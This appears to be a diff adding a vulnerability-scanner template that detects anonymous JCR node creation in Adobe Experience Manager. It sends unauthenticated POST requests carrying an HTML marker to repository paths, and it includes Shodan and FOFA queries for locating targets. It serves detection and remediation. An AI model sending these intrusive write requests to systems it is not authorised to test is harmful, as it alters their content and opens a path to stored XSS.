@@ -1,0 +1,85 @@
+id: aem-anonymous-write
+
+info:
+  name: Adobe Experience Manager (AEM) - Anonymous JCR Node Creation
+  author: DhiyaneshDk,0ang3el
+  severity: high
+  description: |
+    Anonymous users can create new JCR nodes via the AEM POST Servlet, which may allow attackers to inject malicious content, achieve persistent XSS, or abuse servlets registered by resource types for further attacks.
+  impact: |
+    Successful exploitation allows unauthenticated attackers to create arbitrary JCR nodes, potentially leading to persistent cross-site scripting (XSS), content injection, or exploitation of servlets registered to handle specific resource types.
+  remediation: |
+    Configure proper access control lists (ACLs) on AEM paths to prevent anonymous users from creating JCR nodes. Review and restrict permissions on the POST servlet to authenticated users only.
+  reference:
+    - https://clarkvoss.medium.com/the-cve-that-will-never-die-86149b450840
+    - https://github.com/0ang3el/aem-hacker/blob/master/aem_hacker.py
+  classification:
+    cpe: cpe:2.3:a:adobe:experience_manager:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    vendor: adobe
+    product: experience_manager
+    fofa-query: body="/libs/granite/core/content/login.html"
+    shodan-query: http.component:"Adobe Experience Manager"
+  tags: aem,adobe,intrusive,node
+
+flow: http(1) && http(2)
+
+variables:
+  nodename: "{{to_lower(rand_text_alpha(5))}}"
+  random: "{{to_lower(rand_text_alpha(10))}}"
+  marker: "{{to_lower(rand_text_alpha(6))}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    redirects: true
+    max-redirects: 2
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Welcome to Adobe Experience Manager"
+        internal: true
+
+  - raw:
+      - |
+        POST {{path}}{{extension}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        <html>{{marker}}</html>
+    payloads:
+      path:
+        - '/'
+        - '/apps/'
+        - '/libs/'
+        - '/content/'
+        - '/content/usergenerated/'
+        - '/content/usergenerated/etc/commerce/smartlists/'
+
+      extension:
+        - '{{nodename}}*'
+        - '{{nodename}}.json'
+        - '{{nodename}}.1.json'
+        - '{{nodename}}.json/{{random}}.css'
+        - '{{nodename}}.json/{{random}}.html'
+
+    attack: clusterbomb
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<td>Parent Location</td>'
+
+      - type: status
+        status:
+          - 201
+# digest: 490a00463044022011f9e9e91a1f4772b8e133b09de3dd94323e7fe1e5c2e525fe7e72e5ba73c6ba022012ddfec354f211c1ae791c12d3699cd911bc7ac9f4d0380157148ebef81abc0f:922c64590222798bb761d5b6d8e72950
